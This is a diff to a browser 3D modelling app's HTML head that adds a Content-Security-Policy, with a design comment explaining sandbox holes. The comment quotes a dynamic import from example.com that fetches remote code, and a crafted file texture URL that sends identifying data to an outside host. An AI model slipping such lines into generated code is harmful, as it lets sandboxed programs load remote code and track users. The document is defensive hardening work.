@@ -4,7 +4,33 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
     <title>Kline — 3D modelling</title>
-    <meta name="description" content="Kline is an open source 3D modelling application that runs in the browser: mesh editing, modifiers, materials and glTF export." />
+    <meta name="description" content="Kline is a 3D modelling application that runs in the browser and on your desktop: mesh editing, sculpting, rigging, animation, materials and glTF export." />
+    <!--
+      The browser-level half of the sandbox.
+
+      Generated code runs in a blob Worker with the global surface swept down
+      to an allowlist, which stops it *naming* a network API. It does not stop
+      dynamic import(), because that is syntax rather than a global: a program
+      could write import("http://example.com/x.js") and the browser would
+      fetch it. Verified, not theorised — it reached a server before this line
+      existed.
+
+      A blob Worker inherits the policy of the document that created it, so
+      script-src here is what shuts that door. 'unsafe-eval' is required: the
+      harness compiles the program with the Function constructor, which is the
+      same mechanism that lets it control what the program can see.
+
+      img-src is the second layer under a different hole: a crafted .kline file
+      carrying a texture url of https://someone/pixel.png?who=you fired the
+      moment the file opened. That is filtered where the document is parsed,
+      which is the real fix; this stops anything that ever gets past it.
+
+      connect-src is left open on purpose. Kline talks to whatever local model
+      endpoint the person configures — often http://localhost:11434 — and
+      narrowing it here would break that without protecting the sandbox, whose
+      own reach is already gone.
+    -->
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:; img-src 'self' data: blob:; object-src 'none'; base-uri 'self'" />
     <meta name="color-scheme" content="dark" />
     <meta name="theme-color" content="#1b1a1d" />
     <link rel="manifest" href="manifest.webmanifest" />
